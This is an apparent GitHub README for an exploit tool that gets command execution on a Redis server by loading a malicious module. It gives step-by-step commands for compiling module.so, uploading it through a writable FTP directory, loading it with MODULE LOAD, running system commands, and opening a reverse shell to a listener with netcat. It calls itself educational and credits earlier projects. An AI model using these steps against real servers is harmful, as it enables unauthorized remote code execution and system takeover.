# Redis Server Module Load Command Execution

# Usage
## compile module.so
```bash
git clone https://github.com/binaryxploit/redis-module-load-cmd-exec.git
cd ./redis-module-load-cmd-exec
make
```
## Find a way to upload module.so - POC
- Example: 
- ftp access with writable pub directory.
- PATH `/var/ftp/pub/`
```
ftp> put module.so
```
## Load the module via `redis-cli` tool for command execution
```bash
# Required tools
sudo apt-get install redis-tools -y

# Load module.so form uploaded path
REDIS-CLI:6379> MODULE LOAD /var/ftp/pub/module.so

# List Loaded modules
REDIS-CLI:6379> MODULE LIST

# Command Execution
REDIS-CLI:6379> system.exec "id"

# Reverse Shell
nc -nvlp 80
REDIS-CLI:6379> system.rev 192.168.100.10 80
```
---
This Exploit is an aggregation of below exploits made for understanding and educational purposes.
- Credits:
  - https://github.com/RedisLabsModules/RedisModulesSDK
  - https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
